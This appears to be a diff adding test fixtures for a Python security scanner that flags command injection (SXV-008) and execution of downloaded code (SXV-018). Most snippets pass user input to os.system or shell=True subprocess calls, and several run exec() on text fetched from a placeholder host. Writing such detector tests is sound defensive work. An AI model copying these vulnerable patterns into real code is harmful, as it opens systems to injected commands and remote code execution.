+{"name":"test_unrelated_parse_args_method_remains_clean","code":"import os\nclass Config:\n    def parse_args(self):\n        return type('Args', (), {'command': 'safe'})()\nargs = Config().parse_args()\nos.system(args.command)\n","vector":null,"count":0}
+{"name":"truthy-0","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=True)\n","vector":"SXV-008","count":1}
+{"name":"truthy-1","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=1)\n","vector":"SXV-008","count":1}
+{"name":"truthy-2","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell='yes')\n","vector":"SXV-008","count":1}
+{"name":"truthy-3","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=[1])\n","vector":"SXV-008","count":1}
+{"name":"truthy-4","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=(1,))\n","vector":"SXV-008","count":1}
+{"name":"truthy-5","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell={'x': 1})\n","vector":"SXV-008","count":1}
+{"name":"falsey-0","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=False)\n","vector":null,"count":0}
+{"name":"falsey-1","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=0)\n","vector":null,"count":0}
+{"name":"falsey-2","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell='')\n","vector":null,"count":0}
+{"name":"falsey-3","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=None)\n","vector":null,"count":0}
+{"name":"falsey-4","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=[])\n","vector":null,"count":0}
+{"name":"falsey-5","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell=())\n","vector":null,"count":0}
+{"name":"falsey-6","code":"import subprocess, sys\nsubprocess.run(sys.argv[1], shell={})\n","vector":null,"count":0}
+{"name":"wildcard-0","code":"from os import *\nimport sys\nsystem(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"wildcard-1","code":"from subprocess import *\nimport sys\nrun(sys.argv[1], shell=True)\n","vector":"SXV-008","count":1}
+{"name":"mapping-0","code":"import subprocess\nopts = {'shell': True}\nsubprocess.run(input(), shell=opts['shell'])\n","vector":"SXV-008","count":1}
+{"name":"mapping-1","code":"import subprocess\nopts = {'shell': False}\nsubprocess.run(input(), shell=opts['shell'])\n","vector":null,"count":0}
+{"name":"mapping-2","code":"import subprocess\nopts = {}\nsubprocess.run(input(), shell=opts['shell'])\n","vector":null,"count":0}
+{"name":"mapping-3","code":"import subprocess\nopts = {'shell': True}\nkey = input()\nsubprocess.run(input(), shell=opts[key])\n","vector":"SXV-008","count":1}
+{"name":"mapping-4","code":"import subprocess\nopts = {'shell': True}\nsubprocess.run(input(), shell=opts.get('shell', False))\n","vector":"SXV-008","count":1}
+{"name":"mapping-5","code":"import subprocess\nopts = {'shell': False}\nsubprocess.run(input(), shell=opts.get('shell', True))\n","vector":null,"count":0}
+{"name":"mapping-6","code":"import subprocess\nopts = {'shell': True}\nsubprocess.run(input(), shell=opts.get('shell', unknown()))\n","vector":"SXV-008","count":1}
+{"name":"mapping-7","code":"import subprocess\nopts = {}\nsubprocess.run(input(), shell=opts.get('shell', True))\n","vector":"SXV-008","count":1}
+{"name":"mapping-8","code":"import subprocess\nopts = {}\nsubprocess.run(input(), shell=opts.get('shell', False))\n","vector":null,"count":0}
+{"name":"mapping-9","code":"import subprocess\nopts = {}\nsubprocess.run(input(), shell=opts.get('shell'))\n","vector":null,"count":0}
+{"name":"mapping-10","code":"import subprocess\nopts = {}\nkey = input()\nsubprocess.run(input(), shell=opts.get(key, True))\n","vector":"SXV-008","count":1}
+{"name":"mapping-11","code":"import subprocess\nopts = make_options()\nsubprocess.run(input(), shell=opts.get('shell', True))\n","vector":"SXV-008","count":1}
+{"name":"kwargs-0","code":"import subprocess\nsubprocess.run(input(), **{'shell': True})\n","vector":"SXV-008","count":1}
+{"name":"kwargs-1","code":"import subprocess\nopts = {'shell': True}\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"kwargs-clean-0","code":"import subprocess\nopts = {'shell': False}\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"kwargs-clean-1","code":"import subprocess\nopts = {'shell': True}\nopts = {'shell': False}\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"kwargs-clean-2","code":"import subprocess\nopts = make_options()\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-True-0-32","code":"import subprocess\nopts = dict(shell=True)\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-1-33","code":"import subprocess\nopts = dict([('shell', True)])\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-2-34","code":"import subprocess\nopts = dict((('shell', True),))\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-3-35","code":"import subprocess\nopts = {}\nopts['shell'] = True\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-4-36","code":"import subprocess\nopts = {}\nopts.update(shell=True)\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-5-37","code":"import subprocess\nopts = {}\nopts.update({'shell': True})\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-6-38","code":"import subprocess\nopts = {'shell': False}\nopts |= {'shell': True}\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-True-7-39","code":"import subprocess\nopts = {'shell': False} | {'shell': True}\nsubprocess.run(input(), **opts)\n","vector":"SXV-008","count":1}
+{"name":"mapping-update-False-0-40","code":"import subprocess\nopts = dict(shell=False)\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-1-41","code":"import subprocess\nopts = dict([('shell', False)])\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-2-42","code":"import subprocess\nopts = dict((('shell', False),))\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-3-43","code":"import subprocess\nopts = {'shell': True}\nopts['shell'] = False\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-4-44","code":"import subprocess\nopts = {'shell': True}\nopts.update(shell=False)\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-5-45","code":"import subprocess\nopts = {'shell': True}\nopts.update({'shell': False})\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-6-46","code":"import subprocess\nopts = {'shell': True}\nopts |= {'shell': False}\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-7-47","code":"import subprocess\nopts = {'shell': True} | {'shell': False}\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-0-48","code":"import subprocess\nopts = dict(shell=unknown())\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-1-49","code":"import subprocess\nopts = {'shell': True}\nopts['shell'] = unknown()\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-2-50","code":"import subprocess\nopts = {'shell': True}\nopts.update(shell=unknown())\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-3-51","code":"import subprocess\nopts = {'shell': True}\nopts.update({'shell': unknown()})\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-4-52","code":"import subprocess\nopts = {'shell': True}\nopts.update(unknown())\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-5-53","code":"import subprocess\nopts = {'shell': True}\nopts |= {'shell': unknown()}\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"mapping-update-False-6-54","code":"import subprocess\nopts = {'shell': True}\nopts |= unknown()\nsubprocess.run(input(), **opts)\n","vector":null,"count":0}
+{"name":"test_lambda_direct_sink_executes","code":"import os\n(lambda: os.system(input()))()\n","vector":"SXV-008","count":1}
+{"name":"test_module_sink_member_rebinding_is_clean","code":"import os, sys\nos.system = lambda value: None\nos.system(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_subprocess_sink_member_rebinding_is_clean","code":"import subprocess, sys\nsubprocess.run = lambda *args, **kwargs: None\nsubprocess.run(sys.argv[1], shell=True)\n","vector":null,"count":0}
+{"name":"test_source_member_rebinding_is_clean","code":"import os, sys\nsys.argv = ['safe', 'echo safe']\nos.system(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_source_item_rebinding_is_clean","code":"import os, sys\nsys.argv[1] = 'echo safe'\nos.system(sys.argv[1])\n","vector":null,"count":0}
+{"name":"test_network_source_member_rebinding_is_clean","code":"import requests\nrequests.get = lambda url: type('R', (), {'text': 'safe'})()\nexec(requests.get('https://example.invalid').text)\n","vector":null,"count":0}
+{"name":"test_same_line_truthy_second_sink_fires","code":"import subprocess, sys\nsubprocess.run('safe', shell=False); subprocess.run(sys.argv[1], shell=True)\n","vector":"SXV-008","count":1}
+{"name":"test_same_line_false_second_sink_is_clean","code":"import subprocess, sys\nsubprocess.run('safe', shell=True); subprocess.run(sys.argv[1], shell=False)\n","vector":null,"count":0}
+{"name":"test_dict_get_invalid_arity_is_clean","code":"import subprocess, sys\nopts = {'x': {'shell': True}}\nsubprocess.run(sys.argv[1], **opts.get('x', {}, {}))\n","vector":null,"count":0}
+{"name":"test_dict_get_eager_side_effect_is_not_static_proof","code":"import subprocess, sys\nopts = {'x': {'shell': True}}\ndef clear():\n    opts['x'] = {'shell': False}\n    return {}\nsubprocess.run(sys.argv[1], **opts.get('x', clear()))\n","vector":null,"count":0}
+{"name":"test_keyword_only_helper_flow_fires","code":"import os\ndef run(*, command):\n    os.system(command)\nrun(command=input())\n","vector":"SXV-008","count":1}
+{"name":"test_nested_dict_helper_flow_fires","code":"import os\ndef run(config):\n    os.system(config['command'])\nrun({'command': input()})\n","vector":"SXV-008","count":1}
+{"name":"test_direct_method_wrong_argument_is_clean","code":"import os\nclass Runner:\n    def run(self, safe, command):\n        os.system(command)\nRunner().run(input(), 'echo safe')\n","vector":null,"count":0}
+{"name":"test_direct_method_right_argument_fires","code":"import os\nclass Runner:\n    def run(self, safe, command):\n        os.system(command)\nRunner().run('safe', input())\n","vector":"SXV-008","count":1}
+{"name":"test_direct_method_duplicate_binding_is_clean","code":"import os\nclass Runner:\n    def run(self, command):\n        os.system(command)\nRunner().run(input(), command='safe')\n","vector":null,"count":0}
+{"name":"test_keyword_only_direct_method_flow_fires","code":"import os\nclass Runner:\n    def run(self, *, command):\n        os.system(command)\nRunner().run(command=input())\n","vector":"SXV-008","count":1}
+{"name":"test_unrelated_unawaited_call_does_not_hide_awaited_flow","code":"import os\nasync def run(command):\n    os.system(command)\nrun('echo safe')\nasync def main():\n    await run(input())\n","vector":"SXV-008","count":1}
+{"name":"test_assigned_response_content_decode_fires","code":"import requests\nresponse = requests.get('https://example.invalid')\nexec(response.content.decode())\n","vector":"SXV-018","count":1}
+{"name":"test_assigned_response_json_fires","code":"import requests\nresponse = requests.get('https://example.invalid')\nexec(response.json()['payload'])\n","vector":"SXV-018","count":1}
+{"name":"test_assigned_response_iter_content_fires","code":"import requests\nresponse = requests.get('https://example.invalid')\nexec(next(response.iter_content()).decode())\n","vector":"SXV-018","count":1}
+{"name":"test_assigned_response_raw_read_fires","code":"import requests\nresponse = requests.get('https://example.invalid')\nexec(response.raw.read().decode())\n","vector":"SXV-018","count":1}
+{"name":"test_response_status_code_is_clean","code":"import os, requests\nresponse = requests.get('https://example.invalid')\nos.system(response.status_code)\n","vector":null,"count":0}
+{"name":"test_future_module_import_does_not_authorize_sink","code":"import sys\nos.system(sys.argv[1])\nimport os\n","vector":null,"count":0}
+{"name":"test_builtins_sink_member_rebinding_is_clean","code":"import builtins, requests\nbuiltins.exec = lambda value: None\nbuiltins.exec(requests.get('https://example.invalid').text)\n","vector":null,"count":0}
+{"name":"test_class_attribute_does_not_shadow_global_sink_in_method","code":"import os, sys\nclass Safe:\n    def system(self, value):\n        pass\nclass Runner:\n    os = Safe()\n    def run(self):\n        os.system(sys.argv[1])\nRunner().run()\n","vector":"SXV-008","count":1}
+{"name":"test_class_attribute_does_not_shadow_global_source_in_method","code":"import os, sys\nclass Safe:\n    argv = ['safe', 'echo safe']\nclass Runner:\n    sys = Safe()\n    def run(self):\n        os.system(sys.argv[1])\nRunner().run()\n","vector":"SXV-008","count":1}
+{"name":"test_class_attribute_does_not_shadow_builtin_in_method","code":"import requests\nclass Runner:\n    exec = lambda value: None\n    def run(self):\n        exec(requests.get('https://example.invalid').text)\nRunner().run()\n","vector":"SXV-018","count":1}
+{"name":"test_comprehension_target_shadows_sink_module","code":"import os, sys\nclass Safe:\n    def system(self, value):\n        pass\n[os.system(sys.argv[1]) for os in [Safe()]]\n","vector":null,"count":0}
+{"name":"test_module_sink_identity_rebinding_stays_live","code":"import os, sys\nreal = os.system\nos.system = real\nos.system(sys.argv[1])\n","vector":"SXV-008","count":1}
+{"name":"test_network_source_identity_rebinding_stays_live","code":"import requests\nreal = requests.get\nrequests.get = real\nexec(requests.get('https://example.invalid').text)\n","vector":"SXV-018","count":1}
+{"name":"test_sink_alias_self_assignment_stays_live","code":"import os\nlaunch = os.system\nlaunch = launch\nlaunch(input())\n","vector":"SXV-008","count":1}
+{"name":"test_helper_self_assignment_stays_live","code":"import os\ndef run(value):\n    os.system(value)\nrun = run\nrun(input())\n","vector":"SXV-008","count":1}
+{"name":"test_nested_finally_does_not_override_outer_flow","code":"import os\ndef identity(value):\n    def unused():\n        try:\n            return value\n        finally:\n            return 'safe'\n    return value\nos.system(identity(input()))\n","vector":"SXV-008","count":1}
+{"name":"test_shell_compare_true_stays_eligible","code":"import subprocess\nsubprocess.run(input(), shell=(1 == 1))\n","vector":"SXV-008","count":1}
+{"name":"test_shell_not_false_stays_eligible","code":"import subprocess\nsubprocess.run(input(), shell=not False)\n","vector":"SXV-008","count":1}
